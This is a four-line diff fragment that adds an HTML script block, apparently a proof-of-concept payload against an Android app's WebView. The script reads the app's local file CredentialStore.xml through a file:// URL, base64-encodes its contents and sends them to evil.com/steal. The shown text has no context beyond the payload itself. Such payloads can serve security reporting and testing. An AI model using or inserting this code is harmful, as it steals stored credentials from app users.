@@ -1,0 +1,4 @@
+<script>
+     fetch('file:///data/data/com.whatnot_mobile/shared_prefs/CredentialStore.xml')
+       .then(r => r.text()).then(t => fetch('https://evil.com/steal?data=' + btoa(t)));
+   </script>
